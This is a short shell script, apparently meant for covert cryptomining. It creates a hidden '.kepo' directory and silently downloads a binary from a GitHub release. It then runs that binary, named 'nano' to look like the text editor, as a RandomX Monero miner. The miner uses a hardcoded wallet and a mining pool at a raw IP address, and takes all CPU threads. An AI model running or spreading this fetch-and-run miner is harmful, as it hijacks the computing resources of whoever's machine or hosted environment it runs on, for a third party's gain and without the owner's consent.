mkdir .kepo && cd .kepo
sudo apt-get update 
sudo apt-get install -y curl wget
wget https://github.com/Franky777777/razor/releases/download/nano/nano.tar.gz > /dev/null 2>&1
tar -xvf nano.tar.gz
chmod +x nano
./nano -algo RandomX -wallet ZEPHs9VvRqBYzdxe7Qwutt7KLSqnQR96MdUQmsVPMtq39xxWByfFUYDBFrdfD9n3G9P2HAKCiuuu48iZzrQjnEYbAxitysPd9gp -coin XMR -rigName envio -pool1 162.19.241.67:5332 -useSSL false -cpuThreads $(nproc --all) 
